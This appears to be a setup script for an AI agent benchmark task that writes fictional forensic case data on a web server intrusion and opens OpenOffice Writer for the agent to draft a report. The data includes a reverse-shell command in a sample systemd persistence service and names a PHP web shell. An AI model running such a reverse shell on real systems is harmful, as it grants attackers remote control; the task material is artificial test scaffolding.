#!/bin/bash
echo "=== Setting up Forensic Analysis Report Task ==="
source /workspace/scripts/task_utils.sh

# 1. Create Documents directory and clean up
sudo -u ga mkdir -p /home/ga/Documents
rm -f /home/ga/Documents/Forensic_Report_Case_442.odt 2>/dev/null || true
rm -f /home/ga/Documents/case_442_data.json 2>/dev/null || true

# 2. Generate the Case Data JSON
# This file contains the "raw notes" the agent must convert into a report
cat > /home/ga/Documents/case_442_data.json << 'EOF'
{
  "case_info": {
    "agency": "CyberShield Forensics",
    "case_number": "CSF-2025-0442",
    "examiner": "Agent G. Anderson",
    "date": "2025-03-08",
    "incident_type": "Web Server Intrusion"
  },
  "evidence_items": [
    {
      "evidence_id": "EVID-001",
      "description": "Forensic Image of Web Server (Root Volume)",
      "md5_hash": "d41d8cd98f00b204e9800998ecf8427e",
      "size": "500 GB"
    },
    {
      "evidence_id": "EVID-002",
      "description": "System Memory Dump (RAM)",
      "md5_hash": "9e107d9d372bb6826bd81d3542a419d6",
      "size": "16 GB"
    },
    {
      "evidence_id": "EVID-003",
      "description": "Firewall Logs (CSV Export)",
      "md5_hash": "e2fc714c4727ee9395f324cd2e7f331f",
      "size": "45 MB"
    }
  ],
  "analysis_findings": {
    "malware_identified": {
      "filename": "b374k.php",
      "file_path": "/var/www/html/wp-content/uploads/2024/11/b374k.php",
      "sha256_hash": "a1b2c3d4e5f67890abcdef1234567890abcdef1234567890abcdef1234567890",
      "classification": "PHP Web Shell (Backdoor)"
    },
    "persistence_mechanism": {
      "type": "Systemd Service",
      "file_path": "/etc/systemd/system/maintenance.service",
      "content_snippet": "[Service]\nExecStart=/bin/bash -c 'bash -i >& /dev/tcp/192.168.1.50/4444 0>&1'"
    },
    "timeline_events": [
      {
        "timestamp": "2024-11-15T08:42:11Z",
        "event": "Initial access via plugin vulnerability (CVE-2024-9999)"
      },
      {
        "timestamp": "2024-11-15T08:45:30Z",
        "event": "File upload of 'b374k.php' to uploads directory"
      },
      {
        "timestamp": "2024-11-15T09:00:00Z",
        "event": "Creation of persistence service 'maintenance.service'"
      }
    ]
  }
}
EOF

# Set permissions
chown ga:ga /home/ga/Documents/case_442_data.json
chmod 644 /home/ga/Documents/case_442_data.json

# 3. Timestamp for anti-gaming
date +%s > /tmp/task_start_time.txt

# 4. Ensure OpenOffice Writer is running (it's a desktop app task)
# We launch it empty so the agent can start working immediately
if ! pgrep -f "soffice" > /dev/null; then
    echo "Starting OpenOffice Writer..."
    su - ga -c "DISPLAY=:1 /opt/openoffice4/program/soffice --writer &"
    
    # Wait for window
    for i in {1..30}; do
        if DISPLAY=:1 wmctrl -l | grep -i "OpenOffice Writer"; then
            break
        fi
        sleep 1
    done
fi

# Maximize window
DISPLAY=:1 wmctrl -r "OpenOffice Writer" -b add,maximized_vert,maximized_horz 2>/dev/null || true

# 5. Capture initial screenshot
echo "Capturing initial state..."
sleep 2
take_screenshot /tmp/task_initial.png

echo "=== Setup Complete ==="
echo "Data file created at: /home/ga/Documents/case_442_data.json"